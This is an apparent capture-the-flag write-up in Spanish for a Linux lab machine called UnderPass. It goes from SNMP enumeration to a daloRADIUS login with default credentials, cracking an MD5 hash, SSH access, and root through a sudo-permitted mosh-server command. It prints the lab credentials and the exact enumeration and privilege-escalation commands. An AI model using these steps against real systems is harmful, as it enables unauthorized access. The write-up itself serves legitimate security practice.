
<font color="#00b0f0">IP</font>: 10.10.11.48
<font color="#00b0f0">HOSTNAME</font>:
<font color="#00b0f0">S.O</font>:LINUX
<font color="#00b0f0">DIFICULTAD</font>:

WRITEUP


tras no ver nada interesante con el escaneo TCP ni el fuzzing de directorios, vemos a traves de un escaneo UDP que tiene el puerto 161 abierto


usando msf6 auxiliary(scanner/snmp/snmp_enum) >  obtenemos la siguiente informacion

```
[*] System information:

Host IP                       : 10.10.11.48
Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
Contact                       : steve@underpass.htb
Location                      : Nevada, U.S.A. but not Vegas
Uptime snmp                   : 00:25:05.55
Uptime system                 : 00:24:55.01
System date                   : 2025-5-1 18:42:20.0

```


con esto sabemos que hay un server daloradius, por lo que buscando documentacion vemos las rutas tipicas del server

encontramos un login y se accede con las credenciales de admin por defecto administrator:radius

vemos la siguiente informacion de una base de datos alojada en localhost:3306

user :steve
pass: testing123
db name: radius

tambien vemos una lista de usuarios con una entrada, que corresponden al usuario svcMosh y a su hash MD5 412DD4759978ACFCC81DEAB01B382403

Si usamos crackstation podremos ver que la contraseña de svcMosh es underwaterfriends

con estas credenciales accedemos por ssh y obtenemos la flag de user

si ejecutamos sudo -l podemos ver que se puede ejecutar como sudo el comando mosh-server

bastaria con ejecutar el siguiente comando para obtener una shell como root

`svcMosh@underpass:~$  mosh --server="sudo /usr/bin/mosh-server" localhost
`





## <font color="#00b0f0">USERS</font>

| USER | PASSWORD | PERMISOS |
| ---- | -------- | -------- |
|      |          |          |
|      |          |          |


## <font color="#00b0f0">ENUMERACION</font>

Comenzamos enumerando con nmap usando el siguiente comando

```
sudo nmap 10.10.11.48 -Pn -T4 -sSCV -p- --open -oA nmap_underpass -vv
```


| Puerto | Servicio  | Version |
| ------ | --------- | ------- |
| 22     | open  ssh | 8.9     |
| 80     | Apache    | 2.4.52  |


Usamos gobuster para enumerar directorios por fuzzing con el siguente comando 

```
gobuster dir -u http://10.10.11.48 -r  -e  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 
```


con esto descubrimos varios directorios



## <font color="#00b0f0">SERVICIOS INTERESANTES</font>